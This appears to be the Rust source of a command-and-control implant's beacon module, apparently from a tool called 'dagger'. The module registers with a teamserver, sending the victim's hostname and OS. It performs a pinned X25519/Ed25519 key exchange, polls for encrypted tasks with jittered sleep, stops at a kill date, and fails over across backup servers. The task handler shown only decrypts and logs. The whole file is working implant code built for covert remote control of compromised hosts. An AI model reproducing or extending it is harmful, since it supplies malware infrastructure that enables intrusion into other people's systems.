use crate::crypto::{self, EphemeralKeys, KEY_SIZE};
use crate::transport::{self, Transport, TransportResult};
use crate::ImplantConfig;
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use rand::Rng;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{sleep, Duration};
use zeroize::Zeroizing;

/// The beacon manages the implant's lifecycle. It is event-driven:
/// there is no periodic beacon — the implant only communicates when
/// it has results to report or when a keepalive timer expires.
pub struct Beacon {
    config: ImplantConfig,
    transport: Box<dyn Transport>,
    session_key: Arc<Mutex<Option<Zeroizing<[u8; KEY_SIZE]>>>>,
    seq: Arc<Mutex<u64>>,
    keys: Arc<Mutex<EphemeralKeys>>,
}

impl Beacon {
    pub fn new(config: ImplantConfig) -> Result<Self, Box<dyn std::error::Error>> {
        let transport = transport::create_transport(&config.transport, &config.servers[0])?;
        Ok(Self {
            config,
            transport,
            session_key: Arc::new(Mutex::new(None)),
            seq: Arc::new(Mutex::new(0)),
            keys: Arc::new(Mutex::new(EphemeralKeys::generate())),
        })
    }

    /// Run the implant lifecycle. Blocks until kill_date or exit task.
    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        self.register().await?;

        loop {
            if self.config.kill_date > 0 {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                if now >= self.config.kill_date {
                    log::info!("kill date reached, exiting");
                    break;
                }
            }

            match self.transport.checkin().await {
                Ok(result) => {
                    if !result.data.is_empty() {
                        if let Err(e) = self.handle_task(&result.data).await {
                            log::error!("task handling failed: {e}");
                        }
                    }
                }
                Err(e) => {
                    log::warn!("checkin failed: {e}, rotating transport...");
                    self.rotate_transport().await?;
                }
            }

            if self.config.sleep_secs > 0 {
                let jitter_pct = self.config.jitter_pct as f64 / 100.0;
                let jitter = rand::thread_rng().gen_range(0.0..jitter_pct);
                let delay = (self.config.sleep_secs as f64 * (1.0 + jitter)) as u64;
                sleep(Duration::from_secs(delay)).await;
            } else {
                sleep(Duration::from_millis(100)).await;
            }
        }
        Ok(())
    }

    /// Key exchange: send our public key, receive server's public key, derive session key
    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let keys = self.keys.lock().await;
        let register_msg = serde_json::json!({
            "op": "register",
            "pubkey": hex::encode(keys.public.as_bytes()),
            "hostname": hostname::get()
                .unwrap_or_else(|_| "unknown".into())
                .to_string_lossy(),
            "os": std::env::consts::OS,
        });

        self.transport.send(register_msg.to_string().as_bytes()).await?;
        let result = self.transport.checkin().await?;
        let response: serde_json::Value =
            serde_json::from_slice(&result.data).unwrap_or_default();

        let server_pubkey_hex = response
            .get("pubkey")
            .and_then(|v| v.as_str())
            .ok_or("server did not provide public key")?;

        let server_pubkey_bytes = hex::decode(server_pubkey_hex)
            .map_err(|e| format!("invalid server public key hex: {e}"))?;
        if server_pubkey_bytes.len() != KEY_SIZE {
            return Err(format!(
                "invalid server public key length: {} (expected {})",
                server_pubkey_bytes.len(), KEY_SIZE
            ).into());
        }
        let mut server_pubkey_arr = [0u8; KEY_SIZE];
        server_pubkey_arr.copy_from_slice(&server_pubkey_bytes);

        // Verify server public key matches configured key (prevents MITM)
        if self.config.server_pubkey != [0u8; KEY_SIZE]
            && server_pubkey_arr != self.config.server_pubkey
        {
            return Err("server public key mismatch — possible MITM".into());
        }

        // Ed25519 mutual authentication: verify server's handshake signature
        let session_id = response
            .get("session_id")
            .and_then(|v| v.as_str())
            .ok_or("server did not provide session_id")?;

        let sig_hex = response
            .get("signature")
            .and_then(|v| v.as_str())
            .ok_or("server did not provide handshake signature")?;
        let sig_bytes = hex::decode(sig_hex)
            .map_err(|e| format!("invalid signature hex: {e}"))?;
        if sig_bytes.len() != ed25519_dalek::SIGNATURE_LENGTH {
            return Err(format!(
                "invalid signature length: {} (expected {})",
                sig_bytes.len(),
                ed25519_dalek::SIGNATURE_LENGTH
            ).into());
        }
        let signature = Signature::from_slice(&sig_bytes)
            .map_err(|e| format!("invalid signature: {e}"))?;

        let ed25519_pubkey_hex = response
            .get("ed25519_pubkey")
            .and_then(|v| v.as_str())
            .ok_or("server did not provide ed25519 public key")?;
        let ed25519_pubkey_bytes = hex::decode(ed25519_pubkey_hex)
            .map_err(|e| format!("invalid ed25519 public key hex: {e}"))?;
        if ed25519_pubkey_bytes.len() != ed25519_dalek::PUBLIC_KEY_LENGTH {
            return Err(format!(
                "invalid ed25519 public key length: {} (expected {})",
                ed25519_pubkey_bytes.len(),
                ed25519_dalek::PUBLIC_KEY_LENGTH
            ).into());
        }
        let mut ed25519_pubkey_arr = [0u8; ed25519_dalek::PUBLIC_KEY_LENGTH];
        ed25519_pubkey_arr.copy_from_slice(&ed25519_pubkey_bytes);

        // Optional key pinning: if configured, the server's Ed25519 key must match
        if self.config.server_ed25519_pubkey != [0u8; ed25519_dalek::PUBLIC_KEY_LENGTH]
            && ed25519_pubkey_arr != self.config.server_ed25519_pubkey
        {
            return Err("server ed25519 public key mismatch — possible MITM".into());
        }

        // Verify signature over (server_x25519_pubkey || session_id || server_ed25519_pubkey)
        let verifying_key = VerifyingKey::from_bytes(&ed25519_pubkey_arr)
            .map_err(|e| format!("invalid server ed25519 public key: {e}"))?;
        let mut sig_blob: Vec<u8> = Vec::with_capacity(32 + session_id.len() + 32);
        sig_blob.extend_from_slice(&server_pubkey_arr);
        sig_blob.extend_from_slice(session_id.as_bytes());
        sig_blob.extend_from_slice(&ed25519_pubkey_arr);
        verifying_key
            .verify(&sig_blob, &signature)
            .map_err(|_| "server signature verification failed — possible MITM")?;

        let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);
        let shared = crypto::compute_shared(&keys.secret, &server_pub);
        let session_key = crypto::derive_session_key(&shared, session_id.as_bytes(), b"dagger-session-v1");

        let mut sk = self.session_key.lock().await;
        *sk = Some(session_key);
        log::info!("session established");

        Ok(())
    }

    /// Decrypt and dispatch a task from the teamserver
    async fn handle_task(&self, encrypted: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let sk = self.session_key.lock().await;
        let key = sk.ok_or("no session key")?;

        let plaintext = crypto::decrypt(&key, encrypted)?;
        drop(sk);

        if let Ok(task) = serde_json::from_slice::<serde_json::Value>(&plaintext) {
            log::info!("task received: {:?}", task.get("op"));
        }
        Ok(())
    }

    /// Rotate to next transport on failure
    async fn rotate_transport(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        if self.config.servers.len() > 1 {
            let current = self.config.servers.remove(0);
            self.config.servers.push(current);
            let next_url = &self.config.servers[0];
            self.transport = transport::create_transport(&self.config.transport, next_url)?;
        }
        Ok(())
    }
}
